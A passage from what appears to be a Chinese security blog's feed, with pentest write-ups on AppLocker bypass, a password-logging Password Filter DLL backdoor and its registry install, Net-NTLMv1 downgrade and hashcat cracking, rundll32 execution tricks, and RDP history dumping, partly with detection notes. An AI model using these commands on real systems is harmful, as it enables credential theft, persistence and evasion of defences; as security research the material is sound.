[Reflection.Assembly]::Load($bytes) [aaa]::bbb() 调用了[Reflection.Assembly]::Load($bytes) 注： [Reflection.Assembly]是[System.Reflection.Assembly]的简写 3、对比两种方法分别使用了Assembly的LoadFile和Load方法，两者的区别在这里的影响微乎其微 可以分别使用LoadFile和Load方法去调用以上两种方法生成的两个exe(分别由vs2012和csc.exe编译) 互换后的代码如下： $bytes = [System.IO.File]::ReadAllBytes(&quot;C:\6\ConsoleApplication5.exe&quot;) [Reflection.Assembly]::Load($bytes) [ConsoleApplication5.Program]::test() cd C:\windows\diagnostics\system\AERO import-module .\CL_LoadAssembly.ps1 LoadAssemblyFromPath ..\..\..\..\6\bypass.exe [aaa]::bbb() 经过以上测试，可以推断如下两段代码等价： cd C:\windows\diagnostics\system\AERO import-module .\CL_LoadAssembly.ps1 LoadAssemblyFromPath ..\..\..\..\6\bypass.exe [Reflection.Assembly]::LoadFile(&quot;C:\6\bypass.exe&quot;) 依照以上推断，我们可以对Casey Smith的利用代码进行精简，最短的powershell实现代码如下： [Reflection.Assembly]::LoadFile(&quot;C:\6\bypass.exe&quot;) [aaa]::bbb() 4、适用条件实际测试，以上两种方法适用.net 2.0，如果换成.net 4.0编译，在执行时会报错 0x05 小结 本文分别对bohops和Casey Smith的方法做了测试，找到方法的本质是分别使用了Assembly的LoadFile和Load方法。经实际测试，得出该方法只适用于.Net 2.0环境 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[使用LUA脚本绕过Applocker的测试分析]]></title>
    <url>%2Fposts%2F1b26f949.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的文章《Bypass Windows AppLocker》曾对绕过Applocker的方法进行过学习，而最近看到一篇文章介绍了使用LUA脚本绕过Applocker的方法，学习之后产生了以下疑问：绕过原理是什么呢？能绕过哪种AppLocker的规则呢？适用条件又是什么呢？ 文章地址： https://homjxi0e.wordpress.com/2018/03/02/whitelisting-bypassing-using-lua-lanuage-wlua-com/ 0x01 简介 本文将要介绍以下内容： LUA脚本简介 绕过测试 绕过原理 适用条件 防御方法 0x02 LUA脚本简介 轻量小巧的脚本语言 用标准C语言编写 可以被C/C++ 代码调用 可以调用C/C++的函数 在目前所有脚本引擎中的速度最快 0x03 Windows系统下执行LUA脚本 1、安装Lua for Windows，下载地址： http://files.luaforge.net/releases/luaforwindows/luaforwindows 2、输出hello world 脚本内容： print&quot;Hello,world!&quot; cmd： lua.exe 1.txt 如下图 3、调用Windows API 脚本内容： require &quot;alien&quot; MessageBox = alien.User32.MessageBoxA MessageBox:types{ret =&#39;long&#39;,abi =&#39;stdcall&#39;,&#39;long&#39;,&#39;string&#39;,&#39;string&#39;,&#39;long&#39;} MessageBox(0, &quot;title for test&quot;,&quot;LUA call windows api&quot;,0) 执行如下图 4、c++执行LUA脚本 参考代码如下： extern &quot;C&quot; { #include &quot;lua.h&quot; #include &lt;lauxlib.h&gt; #include &lt;lualib.h&gt; } int main(int argc,char* argv[]) { lua_State *L = lua_open(); luaL_openlibs(L); luaL_dofile(L, argv[1]); lua_close(L); return 0; } 工程需要做如下设置： (1)修改VC++ 目录 包含目录，添加C:\Program Files\Lua\5.1\include 库目录，添加C:\Program Files\Lua\5.1\lib (2)链接器 - 输入 - 附加依赖项，添加 lua5.1.lib lua51.lib 执行如下图 c++执行LUA脚本来调用Windows API，需要在同级目录添加支持文件，执行如下图 0x04 测试使用LUA脚本绕过Applocker 测试一：测试系统： Win7x86 安装Lua for Windows 开启Applocker，配置默认规则 使用lua.exe执行脚本： 成功绕过Applocker的拦截 如下图 测试二：测试系统： Win7x86 安装Lua for Windows 开启Applocker，配置默认规则，添加规则： 拦截lua.exe 未绕过Applocker的拦截 如下图 注： 还可以使用wlua.exe执行lua脚本 测试三：测试系统： Win7x64 未安装Lua for Windows 开启Applocker，配置默认规则，系统禁止执行脚本 lua.exe同级目录放置lua5.1.dll(来自Lua for Windows安装路径) 使用lua.exe执行脚本： 未绕过Applocker的拦截 如下图 补充： 将lua.exe换成wlua.exe，脚本内容修改为POC内容，地址如下： https://gist.githubusercontent.com/homjxi0e/fd023113bf8b1b6789afa05c3913157c/raw/6bf41cbd76e9df6d6d3edcc9e289191f898451dc/AppLockerBypassing.wlua 测试结果均相同 0x05 最终结论 经过以上测试，得出最终结论： 使用LUA脚本，在一定程序上能绕过Applocker，但需要满足以下条件： 当前系统已安装Lua for Windows Applocker的规则未禁止lua.exe和wlua.exe 0x06 小结 本文对LUA脚本的开发做了简要介绍，测试使用LUA脚本绕过Applocker的POC，得出最终结论 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Password Filter DLL在渗透测试中的应用]]></title>
    <url>%2Fposts%2F387c4b23.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的文章《域渗透——Hook PasswordChangeNotify》介绍了通过dll注入Hook PasswordChangeNotify来记录新密码的方法，相当于是对API PasswordChangeNotify的利用。我们知道，API PasswordChangeNotify是Password Filter DLL的一个功能函数，那么，对于Password Filter DLL本身，能否直接开发一个可供利用的DLL呢？ 0x01 简介 本文将要介绍以下内容： Password Filter DLL简介 利用Password Filter DLL记录明文密码 利用Password Filter DLL实现的后门 非Windows Server系统下的应用 0x02 Password Filter DLL简介 现实中使用Windows系统时，为了提高系统安全性，防止用户密码被暴力破解，系统管理员往往会对用户密码的复杂度提出要求，可通过配置组策略开启 位置如下： gpedit.msc -&gt; 本地计算机策略 -&gt; 计算机配置 -&gt; Windows设置 -&gt; 安全设置 -&gt; 帐户策略 -&gt; 密码策略 -&gt; 密码必须符合复杂性要求 启用后，密码必须符合下列最低要求: 不能包含用户的帐户名，不能包含用户姓名中超过两个连续字符的部分 至少有六个字符长 包含以下四类字符中的三类字符: 英文大写字母(A 到 Z) 英文小写字母(a 到 z) 10 个基本数字(0 到 9) 非字母字符(例如 !、$、#、%) 默认值: 在域控制器上启用 在独立服务器上禁用 如果该策略仍无法满足对密码复杂度的要求，可以使用Password Filter DLL进一步提高密码的复杂度 实现思路： 通过修改注册表的方式安装Password Filter DLL 用户修改密码时，自动加载Password Filter DLL，导入明文密码 在Password Filter DLL中开发者可以自定义密码复杂度，同明文密码的复杂度进行比较，如果明文密码不满足复杂度条件，弹框提醒用户，密码修改失败 具体使用方法可参考官方文档： https://msdn.microsoft.com/en-us/library/windows/desktop/ms721766(v=vs.85).aspx 0x03 Password Filter DLL的开发 支持以下三个函数： BOOLEAN InitializeChangeNotify(void); NTSTATUS PasswordChangeNotify(_In_ PUNICODE_STRING UserName,_In_ ULONG RelativeId,_In_ PUNICODE_STRING NewPassword); BOOLEAN PasswordFilter(_In_ PUNICODE_STRING AccountName,_In_ PUNICODE_STRING FullName,_In_ PUNICODE_STRING Password,_In_ BOOLEAN SetOperation); 参考资料： https://msdn.microsoft.com/en-us/library/windows/desktop/ms721849(v=vs.85).aspx#password_filter_functions 值得注意的地方： API PasswordChangeNotify和PasswordFilter的传入参数均包括用户的明文密码 API PasswordFilter的返回值为TRUE表示密码符合要求，返回FALSE表示密码不符合复杂度要求，弹框提示用户修改 在编写Password Filter DLL时，需要声明导出函数 提供一个可供参考的POC，地址如下： https://github.com/3gstudent/PasswordFilter 该工程声明了导出函数InitializeChangeNotify、PasswordChangeNotify和PasswordFilter 分别使用PasswordChangeNotify和PasswordFilter记录明文密码，保存在c:\logFile1和c:\logFile2 在编译时需要同目标系统的平台对应 %wZ表示输出PUNICODE_STRING，unicode的字符串指针类型 0x04 Password Filter DLL的安装 1、注册表HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa下的Notification Packages，添加Password Filter DLL的名称，不包括后缀名.dll 2、将Password Filter DLL保存在%windir%\system32\下 3、组策略开启组策略密码必须符合复杂性要求 4、重启系统(注销当前用户不会生效) 5、修改任一用户密码，加载Password Filter DLL 实际测试：测试系统： Windows Server 2008 R2 x64 将Password Filter DLL工程编译生成64位的Win32Project3.dll 1、将Win32Project3.dll保存在%windir%\system32\下 2、修改注册表键值HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa下的Notification Packages，添加Win32Project3 如下图 通过命令行实现的方式如下： 读取键值： REG QUERY &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v &quot;Notification Packages&quot; 获得键值内容： HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa Notification Packages REG_MULTI_SZ scecli\0rassfm 添加Win32Project3： REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v &quot;Notification Packages&quot; /t REG_MULTI_SZ /d &quot;scecli\0rassfm\0Win32Project3&quot; /f 注： \0表示换行 3、Windows Server系统的组策略默认开启密码必须符合复杂性要求 4、重启系统 5、修改用户密码 6、记录明文密码 如下图 注： 能够记录所有用户，包括未登录用户 0x05 域环境下的应用 1、记录明文密码针对域控服务器,需要获得域控服务器权限，在%windir%\system32\下放置Password Filter DLL，修改注册表键值 优势：域控服务器默认开启组策略密码必须符合复杂性要求 不足：必须重启系统才能生效，对于域控服务器来说，很少重启 扩展：将payload改为将明文密码发送至Web服务器，可供参考的代码地址： https://malicious.link/post/2013/2013-09-11-stealing-passwords-every-time-they-change/ 2、后门将Password Filter DLL改为启动后门，例如弹回Meterpreter的shell 域内任一用户在修改密码时均会加载Password Filter DLL，弹回高权限的shell 0x06 非Windows Server系统的应用 目前大部分资料均认为Password Filter DLL仅适用Windows Server系统 对于非Windows Server系统来说，同样可以使用，只是组策略默认禁用组策略密码必须符合复杂性要求 因此需要注意以下问题： 1、命令行查看当前系统的组策略配置组策略配置存储在数据库中，位于%windir%\security\database\secedit.sdb 读取命令如下(管理员权限)： secedit /export /cfg gp.inf /quiet 参数说明： 没有设置/db参数，表示数据库采用默认%windir%\security\database\secedit.sdb /quiet表示不生成日志，否则生成的日志默认保存在%windir%\security\logs\scesrv.log 命令执行后生成文件gp.inf，查看gp.inf中的PasswordComplexity项，1代表开启，0代表关闭 注： gp.inf中的内容不完整，想要获得完整的组策略配置还需要读取注册表 2、修改组策略配置，开启组策略密码必须符合复杂性要求首先导出配置文件gp.inf，将PasswordComplexity项设为1，保存 导入数据库： secedit /configure /db gp.sdb /cfg gp.inf /quiet 刷新组策略，立即生效(否则，重启后生效)： gpupdate/force 0x07 防御检测 根据利用思路，攻击者首先需要获得当前系统的管理员权限 检测思路如下： 1、查看%windir%\system32\下有无可疑dll 2、查看注册表键值HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa下的Notification Packages 3、查看进程lsass.exe加载的dll 如下图 0x08 小结 Password Filter DLL本是系统提供的正常功能，但如果获得了系统的管理员权限，利用这项功能不仅能够记录明文密码，还能用作后门。 本文结合具体的利用思路，介绍了检测方法。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Windows下的密码hash——Net-NTLMv1介绍]]></title>
    <url>%2Fposts%2F13f32944.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的文章《Windows下的密码hash——NTLM hash和Net-NTLM hash介绍》分别对NTLM hash和Net-NTLMv2 hash做了介绍，对于Net-NTLMv2的上一个版本Net-NTLMv1，在安全性上相对来说更脆弱，具体脆弱在哪里呢？本文将要进行介绍 0x01 简介 本文将要介绍以下内容： Net-NTLMv1的加密方法 Net-NTLMv1的破解思路 Net-NTLMv1的利用思路 0x02 Net-NTLMv1的加密方法 对比Net-NTLMv2，Net-NTLMv2的加密流程如下： 客户端向服务器发送一个请求 服务器接收到请求后，生成一个16位的Challenge，发送回客户端 客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，作为response发送给服务器 服务器校验response Net-NTLMv1的加密流程如下： 客户端向服务器发送一个请求 服务器接收到请求后，生成一个8位的Challenge，发送回客户端 客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，作为response发送给服务器 服务器校验response 两者的流程相同，但加密算法不同，Net-NTLMv1相对脆弱 Net-NTLMv1 response的计算方法比较简单，方法如下(目前LM hash很少接触，不考虑)： 将用户的NTLM hash分成三组，每组7比特(长度不够末尾填0)，作为3DES加密算法的三组密钥，加密Server发来的Challenge 详情可参考： http://davenport.sourceforge.net/ntlm.html#theNtlmResponse 0x03 Net-NTLMv1的破解思路 1、捕获Net-NTLMv1数据包，提取关键数据，使用hashcat进行字典破解服务器： 系统： Server2008 x64 IP： 192.168.62.144 登录用户名： log1 登录密码： logtest123! 客户端： 系统： Win7 x64 IP： 192.168.62.137 修改注册表开启Net-NTLMv1: reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 0 /f 注： 自Windows Vista/Server2008开始，系统默认禁用Net-NTLMv1，使用Net-NTLMv2 仅修改客户端即可，服务器不用修改 客户端通过命令行远程连接服务器，命令如下： net use \\192.168.62.144 /u:log1 logtest123! 注： 通过界面访问\\192.168.62.144的文件共享，会多一步验证操作，使用当前用户的口令进行验证 客户端运行Wireshark，捕获数据包，如下图 前四个数据包对应NTLM认证的四个步骤 查看第二个数据包，获得Challenge，为8d2da0f5e21e20ee，如下图 查看第三个数据包，获得LM Response数据为fec9b082080e34ba00000000000000000000000000000000，获得NTLM Response数据为51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04，username为a，hostname为WIN-BH7SVRRDGVA，如下图 这里做一个对比，如果是Net-NTLMv2，Response数据多一项NTLMv2 Response，如下图 下面，使用Hashcat对该Net-NTLM v1进行破解 NTLMv1的格式为： username::hostname:LM response:NTLM response:challenge 构造后的数据如下： log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee Hashcat参数如下： hashcat -m 5500 log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee /tmp/password.list -o found.txt --force 说明： -m： hash-type，5500对应NetNTLMv1，详细参数可查表：https://hashcat.net/wiki/doku.php? -o： 输出文件，字典文件为/tmp/password.list –force代表强制执行，测试系统不支持Intel OpenCL 成功破解出登录的明文密码，输出如下图 2、使用Responder等中间人攻击工具，控制Challenge为固定值1122334455667788可借助彩虹表还原出口令的NTLM hash 例如获得了如下NetNTLMv1 hash: a::WIN-BH7SVRRDGVA:aebc606d66e80ea649198ed339bda8cd7872c227d6baf33a:aebc606d66e80ea649198ed339bda8cd7872c227d6baf33a:1122334455667788 LM hash为aebc606d66e80ea649198ed339bda8cd7872c227d6baf33a 访问网站https://crack.sh/get-cracking/，使用免费的彩虹表进行破解 填入的格式如下： NTHASH:aebc606d66e80ea649198ed339bda8cd7872c227d6baf33a 接着填入邮箱地址，提交后，在很短的时间(1分钟以内)会收到邮件，提示破解成功 参考资料： https://crack.sh/netntlm/ 如下图 破解出的ntlm hash为d25ecd13fddbb542d2e16da4f9e0333d，用时45秒 使用mimikatz获得该用户的ntlm hash，对比结果相同，如下图 0x04 Net-NTLMv1的利用思路 由于Net-NTLMv1的脆弱性，在控制Challenge后可以在短时间内通过彩虹表还原出用户的ntlm hash，所以在利用上首选的是将Win7环境下的默认Net-NTLMv2降级到Net-NTLMv1，获取本机的通信数据，还原出ntlm hash，实现工具: InternalMonologue 下载地址： https://github.com/eladshamir/Internal-Monologue 通过修改注册表使Net-NTLMv2降级到Net-NTLMv1，获得正在运行的用户token，模拟用户同NTLM SSP进行交互，控制Challenge为固定值1122334455667788，导出返回的Net-NTLMv1 response 注： 修改注册表需要管理员权限 修改注册表开启Net-NTLMv1: reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 2 /f 为确保Net-NTLMv1开启成功，还需要修改两处注册表键值： reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\ /v NtlmMinClientSec /t REG_DWORD /d 536870912 /f reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\ /v RestrictSendingNTLMTraffic /t REG_DWORD /d 0 /f 获得的结果可以通过访问网站https://crack.sh/get-cracking/，使用免费的彩虹表进行破解，不再赘述 优点： 这种方式不会对lsass.exe进程进行操作 同本地NTLM SSP进行交互，不会产生流量 没有进行NTLM认证，不会产生日志 补充： 如果以普通用户权限执行InternalMonologue，能够获得当前用户权限的Net-NTLMv2数据包，通过hashcat进行破解，能获得当前用户的明文口令 如上图，获得Net-NTLMv2的数据包如下： a::WIN-BH7SVRRDGVA:1122334455667788:db18ac502e829dfab120e78c041e2f87:01010000000000008e2ddebb92c2d30175f9bda99183337900000000020000000000000000000000 使用hashcat进行字典破解，参数如下： hashcat -m 5600 a::WIN-BH7SVRRDGVA:1122334455667788:db18ac502e829dfab120e78c041e2f87:01010000000000008e2ddebb92c2d30175f9bda99183337900000000020000000000000000000000 /tmp/password.list --force 成功破解，如下图 0x05 防御思路 自Windows Vista起，微软默认使用Net-NTLMv2协议，想要降级到Net-NTLMv1，首先需要获得当前系统的管理员权限 而对于Net-NTLMv2协议，即使抓到了通信数据包，只能对其进行字典攻击或是暴力破解，破解的概率不是很高 综上，自Windows Vista起，系统默认使用的Net-NTLMv2协议在安全性上能够保证 0x06 小结 本文对Net-NTLMv1的加密方法和破解思路进行了介绍，分析测试了工具InternalMonologue，通过InternalMonologue能在普通用户权限下获得Net-NTLMv2数据，这个功能非常棒。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[关于利用rundll32执行程序的分析]]></title>
    <url>%2Fposts%2Fcd246ac0.html</url>
    <content type="text"><![CDATA[0x00 前言 最近看到了一篇有趣的文章《Abusing Exported Functions and Exposed DCOM Interfaces for Pass-Thru Command Execution and Lateral Movement》，介绍了利用rundll32.exe加载url.dll，通过导出函数OpenURL执行程序的方法。于是我对此做了研究，整理成文，解决以下问题： 利用rundll32执行程序的细节和原理 利用脚本批量扫描dll，查找能够执行程序的dll 0x01 简介 本文将要介绍以下内容： rundll32加载dll的用法 OpenURL的用法 API ShellExecute的用法 三者结合实现通过rundll32直接执行程序 寻找其他可用的导出函数 利用powershell脚本批量获得dll的导出函数，筛选特定dll 0x02 相关细节 1、rundll32加载dll的用法官方文档： https://support.microsoft.com/sk-sk/help/164787/info-windows-rundll-and-rundll32-interface 用法： rundll32 &lt;dllname&gt;,&lt;entrypoint&gt; &lt;optional arguments&gt; 参数&lt;entrypoint&gt;代表传入dll的导出函数名，在dll中定义如下： void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow); 参数&lt;optional arguments&gt;对应dll导出函数中的LPSTR lpszCmdLine 也就是说通过rundll32能控制dll导出函数的LPSTR lpszCmdLine参数 2、OpenURL的用法这里直接参考文章中的提示，找到url.dll，包含导出函数OpenURL 使用IDA查看url.dll的导出函数OpenURL，其中调用了API ShellExecute，如下图 查看伪代码，如下图 注意ShellExecute的第二个参数为NULL，第三个参数lpFile对应传入的参数lpFile 3、API ShellExecute的用法函数原型与参数定义如下： HINSTANCE ShellExecute( _In_opt_ HWND hwnd, _In_opt_ LPCTSTR lpOperation, _In_ LPCTSTR lpFile, _In_opt_ LPCTSTR lpParameters, _In_opt_ LPCTSTR lpDirectory, _In_ INT nShowCmd ); 第二个参数为NULL时，表示执行默认操作”open” 第三个参数lpFile表示要打开的程序或文件路径 也就是说，url.dll中导出函数OpenURL的参数lpFile决定API ShellExecute要打开的程序或文件路径 综上， rundll32.exe url.dll,OpenURL calc.exe 实际上的操作为ShellExecuteA(hwnd, NULL, &quot;calc.exe&quot;, NULL, NULL, nShowCmd);，即执行计算器 使用Immunity Debugger动态调试，跟踪到ShellExecuteA，验证判断，传入的参数为calc.exe，如下图 0x03 扩展利用 1、查找url.dll中其它可供利用的导出函数IDA加载url.dll，选择Search - text...，搜索ShellExecuteA 导出函数FileProtocolHandler同样调用API ShellExecute，如下图 测试命令如下： rundll32.exe url.dll,FileProtocolHandler calc.exe 执行计算器 2、查看其它dll是否包含导出函数OpenURL实现思路： 枚举%windir%/system32下所有dll的导出函数，筛选出包含导出函数OpenURL的dll 通过powershell获得dll的导出函数可参考FuzzySecurity的代码，地址如下： https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-Exports.ps1 在这个代码的基础上，添加枚举dll的功能，分别获得导出函数，进行判断 实现细节： (1)枚举c:\windows\system32下的所有dll： $DllSearchPath = dir c:\windows\system32\*.dll foreach($DllName in $DllSearchPath) { $DllName.Name } (2)对于c:\windows\system32\auditpolmsg.dll 会报错提示输入字符串的格式不正确，所以对语句$OffsetPtr = New-Object System.Intptr -ArgumentList $($HModule.ToInt64() + $ExportRVA)加入try catch判断 代码位置： https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-Exports.ps1#L141 (3)对于c:\windows\system32\avicap.dll 会报错，尝试读取或写入受保护的内存，对语句$EXPORT_DIRECTORY_FLAGS = [system.runtime.interopservices.marshal]::PtrToStructure($OffsetPtr, [type]$IMAGE_EXPORT_DIRECTORY)加入try catch判断 (4)目前代码只支持32位dll的判断 完整代码可参考： https://raw.githubusercontent.com/3gstudent/Writeup/master/Find-OpenURL.ps1 执行如下图，获得其他两个dll，分别为ieframe.dll和shdocvw.dll 使用IDA加载ieframe.dll，查看导出函数OpenURL，伪代码如下图 由CInternetShortcut可以得知执行的文件为.url文件 编写一个.url文件，内容如下： [InternetShortcut] URL=c:\windows\system32\calc.exe cmd: rundll32.exe ieframe.dll,OpenURL C:\4\calc.url 成功执行，弹出计算器 同样，shdocvw.dll也是相同的测试结果 3、执行的程序类型调用API ShellExecute执行程序，不仅支持exe，也同样支持脚本 例如执行js文件，内容如下： WScript.Echo(&quot;1&quot;); cmd： rundll32.exe url.dll,OpenURL C:\4\echo.js 执行后弹框 例如hta文件，内容如下： &lt;HTML&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt; &lt;HEAD&gt; &lt;script language=&quot;VBScript&quot;&gt; Window.ReSizeTo 0, 0 Window.moveTo -2000,-2000 Set objShell = CreateObject(&quot;Wscript.Shell&quot;) objShell.Run &quot;calc.exe&quot; self.close &lt;/script&gt; &lt;body&gt; demo &lt;/body&gt; &lt;/HEAD&gt; &lt;/HTML&gt; cmd: rundll32.exe url.dll,OpenURLA C:\4\calc.hta 执行后弹出计算器 例如url文件，内容如下： [InternetShortcut] URL=c:\windows\system32\calc.exe cmd: rundll32.exe ieframe.dll,OpenURL C:\4\calc.url 成功执行，弹出计算器 4、更多利用方法hexacorn在他的文章里分享了另一个可供使用的dll和导出函数： rundll32 zipfldr.dll, RouteTheCall calc.exe 当然，还有更多可供使用的dll，本文暂不介绍 0x04 小结 本文分析了利用rundll32.exe加载url.dll并通过导出函数OpenURL执行程序的细节，对其扩展，尝试利用脚本批量扫描%windir%/system32下的dll，找到能够执行程序的dll，分别验证了bohops和Hexacorn的结论。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——获得Windows系统的远程桌面连接历史记录]]></title>
    <url>%2Fposts%2F792fd457.html</url>
    <content type="text"><![CDATA[0x00 前言 在渗透测试中，远程桌面连接的历史记录不可忽视，根据历史记录往往能定位出关键的服务器。 前几天有一篇文章介绍了如何清除记录，那么这篇文章就来介绍一下如何导出历史记录。 清除记录的文章地址如下： http://woshub.com/how-to-clear-rdp-connections-history/#h2_3 最开始的设想是通过枚举注册表就能够完成，但深入研究发现，想要获得所有用户的历史记录，需要逐个获得用户的NTUSER.DAT文件，通过注册表加载配置单元，导入用户配置信息，再进行枚举才能够实现。 0x01 简介 本文将要介绍以下内容： 获得历史记录的思路 导出登录用户的历史记录 导出所有用户的历史记录 两种方法的实现思路和脚本编写细节 0x02 获得远程桌面连接历史记录的思路 1、获得当前用户的历史记录：枚举注册表键值HKCU:\Software\Microsoft\Terminal Server Client\Servers 每个注册表项保存连接的服务器地址，其中的键值UsernameHint对应登录用户名 如下图 2、获得已登录用户的历史记录：已登录用户的注册表信息会同步保存在HKEY_USERS\SID下，SID要对应每个用户的SID 当前系统登录两个用户，分别有两个子项，如下图 注： HKEY_USERS仅包含了缺省用户设置和登录用户的信息，在用户未登录时用户的设置是不可用的 也就是说，如果当前登录了两个用户，那么这两个用户的注册表信息都会保存在HKEY_USERS\SID下，如果第三个用户未登录，无法直接获得该用户的注册表信息，也就无法导出该用户的远程桌面连接历史记录 所以，通过枚举注册表键值HKEY_USERS\SID\Software\Microsoft\Terminal Server Client\Servers能够获得已登录用户的远程桌面连接历史记录 3、获得所有用户的历史记录：对于未登录用户，无法直接获得注册表配置信息，这里可以通过加载配置单元的方式来解决 选中HKEY_USERS项，文件-加载配置单元，如下图 打开用户的NTUSER.DAT文件，路径为C:\Documents and Settings\用户名\NTUSER.DAT 接着指定一个项名称，即可在HKEY_USERS下读取该用户的注册表配置信息，如下图 注： 删除该项需要通过卸载配置单元来清除 所以，想要获得所有用户的远程桌面连接历史记录，首先需要枚举注册表键值HKEY_USERS\SID\，对于未登录用户，需要加载对应的NTUSER.DAT文件，再次枚举获得完整记录，最后卸载对应的注册表项 补充： 通过命令行实现加载配置单元的实例： Reg load HKEY_USERS\S-1-5-21-1170783345-3748964848-1387080272-1003 C:\Documents and Settings\c\NTUSER.DAT 通过命令行实现卸载配置单元的实例： Reg unload HKEY_USERS\S-1-5-21-1170783345-3748964848-1387080272-1003 0x03 powershell实现细节 1、获得当前用户的历史记录位置:HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers 枚举指定注册表项下的子项: dir &quot;Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; -Name 查询指定注册表项的注册表键值: (Get-ItemProperty -Path &quot;Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\192.168.62.137&quot;).UsernameHint 加入foreach循环实现枚举: $RegPath = &quot;Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\&quot; $QueryPath = dir $RegPath -Name foreach($Name in $QueryPath) { (Get-ItemProperty -Path $RegPath$Name).UsernameHint } 加入捕获异常，不输出错误信息，如果查不到注册表键值，返回无法获得 完整脚本: $RegPath = &quot;Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\&quot; $QueryPath = dir $RegPath -Name foreach($Name in $QueryPath) { Try { $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop | Out-Null).UsernameHint Write-Host &quot;Server:&quot;$Name Write-Host &quot;User:&quot;$User&quot;`n&quot; } Catch { Write-Host &quot;No RDP Connections History&quot; } } 2、获得已登录用户的历史记录位置:HKEY_USERS\SID\Software\Microsoft\Terminal Server Client\Servers 注: SID对应每个用户的sid 首先需要枚举所有用户sid powershell: Get-WmiObject -Class Win32_UserAccount wmi: wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_UserAccount GET /all /FORMAT:list 枚举用户名及其对应的SID: $AllUser = Get-WmiObject -Class Win32_UserAccount foreach($User in $AllUser) { Write-Host $User.Name&quot;:&quot;$User.SID } 将以上脚本结合，先枚举用户的SID，查询对应HKEY_USERS下的注册表项，再次枚举注册表键值项，获得完整结果: (需要管理员权限) $AllUser = Get-WmiObject -Class Win32_UserAccount foreach($User in $AllUser) { $RegPath = &quot;Registry::HKEY_USERS\&quot;+$User.SID+&quot;\Software\Microsoft\Terminal Server Client\Servers\&quot; Write-Host &quot;User:&quot;$User.Name Write-Host &quot;SID:&quot;$User.SID Write-Host &quot;Status:&quot;$User.Status Try { $QueryPath = dir $RegPath -Name -ErrorAction Stop } Catch { Write-Host &quot;No RDP Connections History&quot; Write-Host &quot;----------------------------------&quot; continue } foreach($Name in $QueryPath) { Try { $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint Write-Host &quot;Server:&quot;$Name Write-Host &quot;User:&quot;$User } Catch { Write-Host &quot;No RDP Connections History&quot; } } Write-Host &quot;----------------------------------&quot; } 注： $User.Status表示帐户状态，通过Get-WmiObject -Class Win32_UserAccount无法直接查询到，可通过wmi命令获取：wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_UserAccount GET /all /FORMAT:list 3、获得所有用户的历史记录加载配置单元的文件位置： &quot;C:\Documents and Settings\用户名\NTUSER.DAT&quot; 实现思路： 获得每个用户对应的SID，拼接对应的注册表键值”Registry::HKEY_USERS\”+$User.SID+”\Software\Microsoft\Terminal Server Client\Servers\” 如果读取失败，代表此用户未登录，接着尝试加载配置单元 拼接配置单元文件位置”C:\Documents and Settings\”+$User.Name+”\NTUSER.DAT” 配置单元对应的注册表项以该用户的sid命名 枚举注册表获得历史记录 卸载注册表项 注： 需要新启动一个进程来卸载配置单元，否则提示失败 为了避免使用多个try catch捕获异常，代码结构作了改变，使用If Else作判断，完整实现代码可参考： https://github.com/3gstudent/List-RDP-Connections-History 测试结果如下图 0x04 小结 本文介绍了如何通过powershell获得Windows系统的远程桌面连接历史记录，需要注意的是无法直接获得未登录用户的注册表配置信息(可以加载配置单元解决)。根据远程桌面连接历史记录，往往能定位出关键的服务器。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[配置Additional LSA Protection监控Password Filter DLL]]></title>
    <url>%2Fposts%2F9f5e4b60.html</url>
